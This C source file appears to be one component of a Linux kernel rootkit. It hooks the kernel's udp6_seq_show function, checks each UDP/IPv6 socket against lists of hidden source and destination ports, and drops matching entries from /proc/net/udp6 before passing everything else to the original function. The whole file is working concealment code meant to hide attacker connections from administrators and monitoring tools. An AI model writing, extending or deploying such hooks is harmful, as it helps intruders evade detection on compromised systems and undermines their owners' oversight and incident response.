#include <net/inet_sock.h>

/* include */
#include "type.h"
#include "debug.h"

/* hook */
#include "sym_map.h"

/* logic */
#include "hidden.h"
#include "list_hidden.h"

/* hooked */
#include "udp6_seq_show.h"

int m_udp6_seq_show(struct seq_file *seq, void *v)
{
        unsigned short s,
                       d;

        struct inet_sock *inet;

        DEBUG("shini :: m_udp6_seq_show, called!\n");

        if (v == SEQ_START_TOKEN)
                goto out;

        inet = (struct inet_sock *)v;
        s = ntohs(inet->inet_sport);
        d = ntohs(inet->inet_dport);

        if (hidden_port(s, LIST_HU6_PORT_S) ||
            hidden_port(d, LIST_HU6_PORT_D))
                return 0;
 out:
        return sym_map.old->udp6_seq_show(seq, v);

}

